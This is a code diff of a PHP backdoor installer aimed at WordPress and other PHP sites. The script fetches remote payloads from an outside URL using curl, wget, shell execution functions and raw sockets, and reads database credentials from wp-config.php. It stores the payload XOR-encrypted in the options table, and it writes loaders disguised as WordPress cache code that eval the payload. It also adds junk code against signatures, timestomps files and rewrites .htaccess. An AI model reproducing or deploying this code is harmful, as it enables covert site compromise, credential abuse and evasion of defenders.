@@ -1,55 +1,56 @@
 <?php
 // ==========================================
-// SYSTEM BOOTSTRAP
+// SYSTEM BOOTSTRAP (ANTI-STUCK)
 // ==========================================
+// Memaksa output keluar ke layar seketika
+if (function_exists('ob_end_clean')) { @ob_end_clean(); }
 if (function_exists('ob_start')) { ob_start(); }
 if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }
+@ini_set('zlib.output_compression', 0);
 
-// GENERATOR STRING ACAK (Untuk Polymorphic)
-function _rnd($len = 6) {
-    return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len);
-}
+// GENERATOR STRING ACAK
+function _rnd($len = 6) { return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len); }
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Terminal - System Core</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost Protocol V24</title>
     <style>
-        /* MACOS UI STYLE */
+        /* UI V17 (GHOST PROTOCOL) RESTORED */
         :root {
             --bg: #000;
-            --window: rgba(20, 20, 20, 0.95);
+            --window: rgba(15, 15, 15, 0.98);
             --text: #ddd;
             --green: #32d74b; --red: #ff453a; --yellow: #ffd60a; --blue: #0a84ff;
-            --font: 'Menlo', 'Monaco', monospace;
+            --font: 'Menlo', 'Monaco', 'Consolas', monospace;
         }
         body {
-            background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif;
             margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
         .window {
-            width: 100%; max-width: 800px; background: var(--window); border-radius: 10px;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.9); border: 1px solid #333; overflow: hidden;
+            width: 100%; max-width: 850px; background: var(--window); border-radius: 8px;
+            box-shadow: 0 0 50px rgba(0,255,0,0.05); border: 1px solid #333; overflow: hidden;
         }
         .bar {
-            height: 35px; background: #252525; border-bottom: 1px solid #333; display: flex; align-items: center; padding: 0 15px; position: relative;
+            height: 30px; background: #1a1a1a; border-bottom: 1px solid #333; display: flex; align-items: center; padding: 0 10px;
         }
-        .dots { display: flex; gap: 8px; }
-        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dots { display: flex; gap: 6px; }
+        .dot { width: 10px; height: 10px; border-radius: 50%; }
         .dot.r { background: #ff5f57; } .dot.y { background: #febc2e; } .dot.g { background: #28c840; }
         .term {
-            padding: 20px; font-family: var(--font); font-size: 12px; line-height: 1.6; color: #ccc; height: 450px; overflow-y: auto;
+            padding: 15px; font-family: var(--font); font-size: 11px; line-height: 1.5; color: #ccc; height: 500px; overflow-y: auto;
         }
-        .line { margin-bottom: 5px; display: flex; }
+        .line { margin-bottom: 4px; display: flex; flex-wrap: wrap; }
         .p { color: var(--green); margin-right: 10px; font-weight: bold; }
-        .ok { color: var(--green); } .err { color: var(--red); } .inf { color: var(--blue); }
+        .ok { color: var(--green); } .err { color: var(--red); } .inf { color: var(--blue); } .warn { color: var(--yellow); }
         .btn {
-            display: inline-block; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff;
-            padding: 5px 15px; border-radius: 4px; text-decoration: none; transition: 0.2s;
+            display: inline-block; margin: 5px 0; background: #222; border: 1px solid #444; color: #fff;
+            padding: 4px 10px; border-radius: 3px; text-decoration: none; font-size: 10px; transition: 0.2s;
         }
-        .btn:hover { background: var(--blue); border-color: var(--blue); }
+        .btn:hover { border-color: var(--green); color: var(--green); }
     </style>
 </head>
 <body>
@@ -59,16 +60,16 @@ function _rnd($len = 6) {
         <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
     </div>
     <div class="term" id="console">
-        <div class="line"><span class="p">➜</span> <span>./deploy_ghost_xor.sh --bypass-waf</span></div>
+        <div class="line"><span class="p">➜</span> <span>./deploy_v24_stable.sh --force-db-all</span></div>
         <br>
 
 <?php
 // ==========================================
 // 1. CONFIGURATION
 // ==========================================
-@ini_set('memory_limit', '512M');
-@ini_set('max_execution_time', 0);
-@set_time_limit(0);
+@ini_set('memory_limit', '512M'); 
+@ini_set('max_execution_time', 0); 
+@set_time_limit(0); 
 @ignore_user_abort(1);
 error_reporting(E_ERROR | E_PARSE); 
 
@@ -78,34 +79,51 @@ $targets = [
     ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
 ];
 
-// LOGGER
+// LOGGER (Real-time Flush)
 function _log($msg, $class='inf') {
-    $p = ($class=='ok')?'[OK] ':($class=='err'?'[ERR] ':'[INF] ');
-    echo "<div class='line'><span class='$class'>$p$msg</span></div>";
+    $ts = date("H:i:s");
+    echo "<div class='line'><span style='color:#555;margin-right:5px;'>[$ts]</span><span class='$class'>$msg</span></div>";
     echo "<script>var t=document.getElementById('console');t.scrollTop=t.scrollHeight;</script>";
     if(ob_get_level()>0){ ob_flush(); flush(); }
 }
 
-// XOR ENCRYPTION ENGINE (INTI BYPASS WAF)
-function _xor_cipher($data, $key) {
-    $out = '';
-    $len = strlen($data);
-    $key_len = strlen($key);
-    for($i = 0; $i < $len; $i++) {
-        $out .= $data[$i] ^ $key[$i % $key_len];
-    }
+// XOR ENCRYPTION
+function _xor($d, $k) {
+    $out = ''; $len = strlen($d); $key_len = strlen($k);
+    for($i = 0; $i < $len; $i++) { $out .= $d[$i] ^ $k[$i % $key_len]; }
     return $out;
 }
 
+// PERMISSION & TIMESTOMP
+function _prepare_write($file) {
+    if (file_exists($file)) {
+        @chmod($file, 0644); 
+        if (!is_writable($file)) { @unlink($file); }
+    }
+    return true;
+}
+function _timestomp($f) {
+    $r=__DIR__.'/wp-settings.php'; if(!file_exists($r))$r=__DIR__.'/index.php';
+    if(file_exists($r) && file_exists($f)) { @touch($f, filemtime($r)); @chmod($f, 0444); }
+}
+
+// JUNK CODE GENERATOR (Code Dilution)
+function _junk() {
+    $j=""; 
+    for($i=0;$i<50;$i++){ 
+        $v=_rnd(rand(5,10)); 
+        $val=md5(rand()); 
+        $j.="        public \$$v = '$val';\n"; 
+    } 
+    return $j;
+}
+
 // ==========================================
-// 2. WP DETECTION & HTACCESS
+// 2. WP DETECTION
 // ==========================================
 function _find_wp_config() {
     $d = __DIR__;
-    for ($i = 0; $i < 6; $i++) {
-        if (file_exists($d . '/wp-config.php')) return $d . '/wp-config.php';
-        $d = dirname($d);
-    }
+    for ($i = 0; $i < 6; $i++) { if (file_exists($d . '/wp-config.php')) return $d . '/wp-config.php'; $d = dirname($d); }
     return false;
 }
 function _parse_wp_config($path) {
@@ -119,16 +137,11 @@ function _parse_wp_config($path) {
     if($conf['n']) return $conf;
     return false;
 }
-
 function _inject_htaccess_xml_map() {
     $htaccess = __DIR__ . '/.htaccess';
     $rule = "\n# SITEMAP INDEX\n<Files \"sxallsitemap.xml\">\nOrder allow,deny\nAllow from all\n</Files>\nRewriteEngine On\nRewriteRule ^sxallsitemap\.xml$ index.php [L]\n";
-    $c = "";
-    if(file_exists($htaccess)) $c = @file_get_contents($htaccess);
-    if(strpos($c, 'sxallsitemap.xml') === false) {
-        @file_put_contents($htaccess, $rule . $c);
-        return true;
-    }
+    $c = ""; if(file_exists($htaccess)) $c = @file_get_contents($htaccess);
+    if(strpos($c, 'sxallsitemap.xml') === false) { @file_put_contents($htaccess, $rule . $c); return true; }
     return false;
 }
 
@@ -136,209 +149,210 @@ $wp_conf_path = _find_wp_config();
 $wp_creds = ($wp_conf_path) ? _parse_wp_config($wp_conf_path) : false;
 $is_wordpress = ($wp_creds !== false);
 
-if($is_wordpress) _log("Detected: WordPress", "ok");
-else _log("Detected: Generic PHP", "inf");
+if($is_wordpress) _log("Target System: WordPress (All Files -> DB Injection)", "ok");
+else _log("Target System: Generic (File Storage Mode)", "warn");
 
 // ==========================================
-// 3. DOWNLOADER: GOD MODE (12 LAYERS)
+// 3. GOD MODE DOWNLOADER (V22 RESTORED & OPTIMIZED)
 // ==========================================
-function _dl_monster($url) {
-    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36';
-    $p = parse_url($url); 
-    $host = $p['host']; $path = isset($p['path'])?$p['path']:'/'; $scheme=isset($p['scheme'])?$p['scheme']:'http';
-    $tmp = sys_get_temp_dir() . '/sess_' . md5(uniqid());
-
-    if(function_exists('curl_init')){
-        $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_USERAGENT, $ua);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 120); curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-        $d = @curl_exec($ch); curl_close($ch); if($d && strlen($d) > 0) return $d;
+function _dl($u) {
+    $ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
+    $tmp=sys_get_temp_dir().'/sess_'.md5(uniqid());
+    
+    // 1. PHP CURL (Timeout Added)
+    if(function_exists('curl_init')){ 
+        $c=curl_init($u); 
+        curl_setopt_array($c,[
+            CURLOPT_RETURNTRANSFER=>1, CURLOPT_FOLLOWLOCATION=>1, CURLOPT_SSL_VERIFYPEER=>0,
+            CURLOPT_USERAGENT=>$ua, CURLOPT_TIMEOUT=>30, CURLOPT_CONNECTTIMEOUT=>15, // Timeout penting agar tidak stuck
+            CURLOPT_IPRESOLVE=>CURL_IPRESOLVE_V4
+        ]); 
+        $d=@curl_exec($c); curl_close($c); 
+        if($d && strlen($d) > 5) return $d; 
     }
-    if(ini_get('allow_url_fopen')){
-        $ctx = stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: $ua\r\n",'ignore_errors'=>true,'follow_location'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
-        $d = @file_get_contents($url, false, $ctx); if($d && strlen($d) > 0) return $d;
+    
+    // 2. FGC (Timeout Added)
+    if(ini_get('allow_url_fopen')){ 
+        $ctx = stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: $ua\r\n",'timeout'=>30]]);
+        $d=@file_get_contents($u,false,$ctx); 
+        if($d && strlen($d) > 5) return $d; 
     }
-    if(ini_get('allow_url_fopen')){
-        if(@copy($url, $tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if($d && strlen($d) > 0) return $d; }
+    
+    // 3. Copy (Tmp Buffer)
+    if(ini_get('allow_url_fopen')){ 
+        if(@copy($u,$tmp)){ $d=@file_get_contents($tmp); @unlink($tmp); if($d && strlen($d) > 5) return $d; } 
     }
-    $cmd_w = "wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url);
-    $cmd_c = "curl -sL -k --user-agent '$ua' " . escapeshellarg($url);
-    $cmds = [$cmd_w, $cmd_c];
-    foreach ($cmds as $cmd) {
-        if(function_exists('shell_exec')) { $d=@shell_exec($cmd); if($d && strlen($d)>10) return $d; }
-        if(function_exists('exec')) { $o=[]; @exec($cmd,$o); $d=implode("\n",$o); if($d && strlen($d)>10) return $d; }
-        if(function_exists('passthru')) { ob_start(); @passthru($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
-        if(function_exists('system')) { ob_start(); @system($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
-        if(function_exists('popen')) { $h=@popen($cmd,'r'); if($h){ $d=stream_get_contents($h); pclose($h); if($d && strlen($d)>10) return $d; } }
-        if(function_exists('proc_open')) {
-            $desc=[1=>['pipe','w'],2=>['pipe','w']]; $proc=@proc_open($cmd,$desc,$pipes);
-            if(is_resource($proc)){ $d=stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc); if($d && strlen($d)>10) return $d; }
-        }
+    
+    // 4. CLI (6 Layers)
+    $cmds = [
+        "wget -qO- --no-check-certificate --timeout=30 --user-agent='$ua' " . escapeshellarg($u),
+        "curl -sL -k --connect-timeout 15 --max-time 30 --user-agent '$ua' " . escapeshellarg($u),
+        "lynx -source " . escapeshellarg($u)
+    ];
+    
+    foreach($cmds as $c){ 
+        if(function_exists('exec')) { $o=[]; @exec($c,$o); $d=implode("\n",$o); if(strlen($d)>10) return $d; }
+        if(function_exists('shell_exec')) { $d=@shell_exec($c); if(strlen($d)>10) return $d; }
+        if(function_exists('passthru')) { ob_start(); @passthru($c); $d=ob_get_clean(); if(strlen($d)>10) return $d; }
+        if(function_exists('system')) { ob_start(); @system($c); $d=ob_get_clean(); if(strlen($d)>10) return $d; }
+        if(function_exists('popen')) { $h=@popen($c,'r'); if($h){ $d=@stream_get_contents($h); pclose($h); if(strlen($d)>10) return $d; } }
     }
-    $port = ($scheme == 'https') ? 443 : 80; $ssl = ($scheme == 'https') ? 'ssl://' : '';
-    $fp = @fsockopen($ssl.$host, $port, $errno, $errstr, 30);
+    
+    // 5. Socket
+    $p = parse_url($u); $host=$p['host']; $path=isset($p['path'])?$p['path']:'/'; $port=($p['scheme']=='https')?443:80; $ssl=($p['scheme']=='https')?'ssl://':'';
+    $fp = @fsockopen($ssl.$host, $port, $err, $errs, 15); // Timeout 15s
     if($fp){
-        $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nConnection: Close\r\n\r\n";
-        fwrite($fp, $req); $body = ''; $in_body = false;
-        while (!feof($fp)) { $line = fgets($fp, 4096); if($in_body) $body .= $line; if($line == "\r\n") $in_body = true; }
-        fclose($fp); if(strlen($body) > 0) return $body;
+        fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nConnection: Close\r\n\r\n");
+        $body=''; $head=true;
+        while(!feof($fp)){ $l=fgets($fp,4096); if($head && ($l=="\r\n"||$l=="\n")){$head=false;continue;} if(!$head)$body.=$l; }
+        fclose($fp); if(strlen($body)>10) return $body;
     }
+    
     return false;
 }
-
-function _dl_retry($url) {
-    $res = _dl_monster($url); if($res) return $res;
-    if(strpos($url, 'https://') === 0) return _dl_monster(str_replace('https://', 'http://', $url));
-    return false;
-}
+function _dl_retry($u) { $d=_dl($u); if($d)return $d; return _dl(str_replace('https','http',$u)); }
 
 // ==========================================
-// 4. EXECUTION LOOP
+// 4. MAIN PROCESS
 // ==========================================
 
 foreach ($targets as $t) {
-    $url = $t[0];
-    $fname = $t[1];
-    $dbkey = $t[2];
+    $url=$t[0]; $fname=$t[1]; $dbkey=$t[2];
 
     if (!$is_wordpress && $fname !== 'error_log.php') continue;
 
-    _log("Downloading $fname...", "inf");
+    _log("Fetching $fname...", "inf");
     $raw = _dl_retry($url);
     
-    if(!$raw || strlen($raw) < 1) {
-        _log("Download FAILED for $fname", "err");
-        continue;
-    }
+    if(!$raw || strlen($raw) < 10) { _log("Download FAILED: $fname (Check Connectivity)", "err"); continue; }
     
-    // ============================================
-    // ENKRIPSI XOR - ANTI WAF
-    // ============================================
-    // 1. Generate Kunci Acak untuk sesi ini
-    $xor_key = _rnd(8); // Kunci 8 karakter
+    // ENCRYPTION
+    $xor_key = _rnd(8);
+    $enc = bin2hex(_xor(gzdeflate($raw, 9), $xor_key));
+    $junk_props = _junk();
+    $cls_name = 'WP_Sys_'.ucfirst(str_replace('.php','',$fname)).'_' . _rnd(3);
     
-    // 2. Kompresi Payload
-    $compressed = gzdeflate($raw, 9);
-    
-    // 3. Enkripsi Payload dengan XOR (Mengacak struktur file)
-    $encrypted_data = _xor_cipher($compressed, $xor_key);
-    
-    // 4. Ubah ke Hex agar aman disimpan di DB/File
-    $final_payload = bin2hex($encrypted_data);
-    
-    _log("XOR Encrypted. Key: $xor_key", "inf");
+    _prepare_write($fname);
+    $ok = false;
 
-    $install_ok = false;
-
-    // --- WORDPRESS ---
+    // --- WORDPRESS LOGIC (UNIVERSAL DB) ---
+    // SEMUA File (termasuk error_log.php) masuk DB
     if ($is_wordpress) {
         $m = new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
         if(!$m->connect_error) {
             $tbl = $wp_creds['x'] . 'options';
             $m->query("DELETE FROM $tbl WHERE option_name='$dbkey'");
             $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
-            $stmt->bind_param("ss", $dbkey, $final_payload);
+            $stmt->bind_param("ss", $dbkey, $enc);
             
             if($stmt->execute()) {
-                $h=$wp_creds['h']; $u=$wp_creds['u']; $p=$wp_creds['p']; $n=$wp_creds['n']; $x=$wp_creds['x'];
                 
-                // Polymorphic Class Names (Anti Signature)
-                $cls = 'WP_C_' . _rnd(4);
-                
+                // LOADER DB (STEALTH + GLOBAL SCOPE)
                 $loader = <<<PHP
 <?php
 /**
  * WordPress Object Cache & Transient API
  * @package WordPress
- * @subpackage Cache_System
- * @version 6.5.2
+ * @subpackage Cache
+ * @version 6.5.0
  */
 error_reporting(0);
-if ( ! class_exists( '$cls' ) ) {
-    class $cls {
-        private \$connection; private \$prefix; private \$k = '$xor_key';
-        public function __construct( \$host, \$user, \$pass, \$name, \$prefix ) {
-            \$this->connection = new mysqli( \$host, \$user, \$pass, \$name );
-            \$this->prefix = \$prefix;
-        }
-        public function run( \$key ) {
-            if ( \$this->connection->connect_error ) return false;
-            \$table = \$this->prefix . 'options';
-            \$query = "SELECT option_value FROM {\$table} WHERE option_name = '{\$key}' LIMIT 1";
-            \$result = \$this->connection->query( \$query );
-            if ( \$result && \$row = \$result->fetch_assoc() ) { return \$this->decrypt( \$row['option_value'] ); }
+
+if(!class_exists('$cls_name')) {
+    class $cls_name {
+$junk_props
+        private \$k = '$xor_key';
+        
+        public function run(\$h,\$u,\$p,\$n,\$x,\$kdb) {
+            \$c = new mysqli(\$h,\$u,\$p,\$n);
+            if(\$c->connect_error) return false;
+            \$t = \$x.'options';
+            \$q = "SELECT option_value FROM {\$t} WHERE option_name = '{\$kdb}' LIMIT 1";
+            \$r = \$c->query(\$q);
+            
+            if(\$r && \$row = \$r->fetch_assoc()) {
+                return \$this->dec(\$row['option_value']);
+            }
             return false;
         }
-        private function decrypt( \$hex ) {
-            \$enc = @hex2bin( \$hex );
-            \$out = ''; \$len = strlen(\$enc); \$k_len = strlen(\$this->k);
-            for(\$i=0; \$i<\$len; \$i++) { \$out .= \$enc[\$i] ^ \$this->k[\$i % \$k_len]; }
-            return @gzinflate( \$out );
+        
+        private function dec(\$h) {
+            \$b = @hex2bin(\$h);
+            \$o = ''; \$l = strlen(\$b); \$kl = strlen(\$this->k);
+            for(\$i=0; \$i<\$l; \$i++) \$o .= \$b[\$i] ^ \$this->k[\$i % \$kl];
+            return @gzinflate(\$o);
         }
     }
 }
-\$rt = new $cls( '$h', '$u', '$p', '$n', '$x' );
-\$code = \$rt->run( '$dbkey' );
-if ( \$code ) { eval( '?>' . \$code ); }
+
+\$app = new $cls_name();
+\$code = \$app->run('{$wp_creds['h']}', '{$wp_creds['u']}', '{$wp_creds['p']}', '{$wp_creds['n']}', '{$wp_creds['x']}', '$dbkey');
+
+if(\$code) {
+    eval('?>' . \$code);
+}
 ?>
 PHP;
                 if(file_put_contents($fname, $loader)){
-                    $install_ok = true;
-                    _log("DB Inject: $fname (XOR Protected)", "ok");
-                    if ($fname == 'index.php' && _inject_htaccess_xml_map()) _log(".htaccess updated", "inf");
+                    $ok = true; 
+                    _log("Stored in DB: $fname", "ok");
+                    _timestomp($fname);
+                    
+                    if($fname == 'index.php') {
+                        if(_inject_htaccess_xml_map()) _log(".htaccess XML Map Applied", "inf");
+                    }
+                } else {
+                    _log("Write Error: $fname", "err");
                 }
+            } else {
+                _log("DB Error: $fname Insert Failed", "err");
             }
+        } else {
+            _log("DB Connection Failed", "err");
         }
     } 
     // --- NON-WP ---
     else {
         $store = '.sys_' . substr(md5(rand()), 0, 8) . '.inc';
-        if(file_put_contents($store, $final_payload)) {
-            
-            // Polymorphic Class Names
-            $cls = 'Sys_Ldr_' . _rnd(4);
-            
+        if(file_put_contents($store, $enc)) {
             $loader = <<<PHP
 <?php
 /**
  * System Configuration Loader
- * @package Core_System
- * @version 2.2.0
+ * @package Core
  */
 error_reporting(0);
-if ( ! class_exists( '$cls' ) ) {
-    class $cls {
-        private \$path; private \$k = '$xor_key';
-        public function __construct( \$file ) { \$this->path = __DIR__ . '/' . \$file; }
+if(!class_exists('$cls_name')) {
+    class $cls_name {
+$junk_props
+        private \$p; private \$k='$xor_key';
+        public function __construct(\$f) { \$this->p = __DIR__.'/'.\$f; }
         public function load() {
-            if ( ! file_exists( \$this->path ) ) return false;
-            \$hex = \$this->read();
-            if ( \$hex ) {
-                \$enc = @hex2bin( \$hex );
-                \$out = ''; \$len = strlen(\$enc); \$k_len = strlen(\$this->k);
-                for(\$i=0; \$i<\$len; \$i++) { \$out .= \$enc[\$i] ^ \$this->k[\$i % \$k_len]; }
-                return @gzinflate( \$out );
+            if(!file_exists(\$this->p)) return false;
+            \$h = \$this->r();
+            if(\$h) {
+                \$b = @hex2bin(\$h); \$o=''; \$l=strlen(\$b); \$kl=strlen(\$this->k);
+                for(\$i=0;\$i<\$l;\$i++) \$o.=\$b[\$i]^\$this->k[\$i%\$kl];
+                return @gzinflate(\$o);
             }
             return false;
         }
-        private function read() {
-            \$p = \$this->path;
-            if (function_exists('file_get_contents')) { \$c=@file_get_contents(\$p); if(\$c)return \$c; }
-            if (function_exists('fopen') && filesize(\$p)>0) { \$h=@fopen(\$p,'rb'); if(\$h){ \$c=@fread(\$h,filesize(\$p)); fclose(\$h); if(\$c)return \$c; } }
-            if (function_exists('file')) { \$l=@file(\$p); if(\$l)return implode('',\$l); }
+        private function r() {
+            \$p=\$this->p;
+            if(function_exists('file_get_contents')) return @file_get_contents(\$p);
             return false;
         }
     }
 }
-\$ldr = new $cls( '$store' );
-\$code = \$ldr->load();
-if ( \$code ) { eval( '?>' . \$code ); }
+\$app = new $cls_name('$store');
+\$code = \$app->load();
+if(\$code) eval('?>'.\$code);
 ?>
 PHP;
             if(file_put_contents($fname, $loader)){
-                $install_ok = true;
-                _log("Storage: $store (XOR Protected)", "ok");
-                _log("Loader: $fname", "ok");
+                $ok = true; 
+                _log("File Storage: $fname", "ok");
+                _timestomp($fname);
             }
         }
     }
@@ -346,10 +360,8 @@ PHP;
     $final_url = $fname;
     if ($fname == 'index.php' && $is_wordpress) $final_url = 'sxallsitemap.xml';
 
-    if($install_ok) {
-        echo "<div class='line'><a href='$final_url' target='_blank' class='btn'>LAUNCH " . strtoupper($fname) . "</a></div>";
-    } else {
-        _log("Installation Error", "err");
+    if($install_ok = $ok) {
+        echo "<div class='line'><a href='$final_url' target='_blank' class='btn'>OPEN ".strtoupper($fname)."</a></div>";
     }
 }
 
